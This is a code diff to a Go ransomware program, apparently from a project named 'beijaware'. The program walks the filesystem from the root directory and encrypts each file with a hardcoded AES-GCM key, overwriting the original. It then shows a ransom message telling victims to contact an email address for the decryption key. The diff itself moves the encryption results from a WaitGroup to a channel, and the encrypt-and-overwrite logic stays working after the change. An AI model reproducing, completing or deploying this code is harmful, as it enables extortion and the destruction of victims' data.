@@ -10,16 +10,15 @@ import (
 	"io/ioutil"
 	"os"
 	"runtime"
-	"sync"
 
 	"github.com/dalbonip/beijaware/explorer"
 )
 
 var Dir string = "/" // Insert starting directory
-var wg sync.WaitGroup
+//var wg sync.WaitGroup
 
 func main() {
-	//Encrypted := make(chan []byte, 100)
+	Encrypted := make(chan []byte, 100)
 	cryptoKey := "686561646d696e64706172746e6572737265647465616d313333374031333337" //keygen.Keygen()
 	contact := ""                                                                   // Insert contact email
 	//fmt.Println("THIS IS THE KEY:", cryptoKey)
@@ -41,14 +40,15 @@ func main() {
 
 	// for each file encrypt file with key in 644 perm
 	for _, v := range files {
-		wg.Add(1)
+		//wg.Add(1)
 		file, err := ioutil.ReadFile(v)
 
 		if err != nil {
 			continue
 		}
 
-		go Encrypt(file, key, v)
+		go Encrypt(file, key, Encrypted, v)
+		ioutil.WriteFile(v, <-Encrypted, 0644)
 	}
 
 	msg := "Your files have been encrypted.\nContact " + contact + " to get the decrypter/ decrypt key."
@@ -58,11 +58,11 @@ func main() {
 	if err != nil {
 		panic(err)
 	}
-	wg.Wait()
+	//wg.Wait()
 }
 
-func Encrypt(plainText []byte, key []byte, v string) {
-	defer wg.Done()
+func Encrypt(plainText []byte, key []byte, Encrypted chan []byte, v string) {
+	//defer wg.Done()
 	block, err := aes.NewCipher(key)
 
 	if err != nil {
@@ -83,7 +83,5 @@ func Encrypt(plainText []byte, key []byte, v string) {
 
 	cypherText := gcm.Seal(nonce, nonce, plainText, nil)
 
-	//Encrypted <- cypherText
-
-	ioutil.WriteFile(v, cypherText, 0644)
+	Encrypted <- cypherText
 }
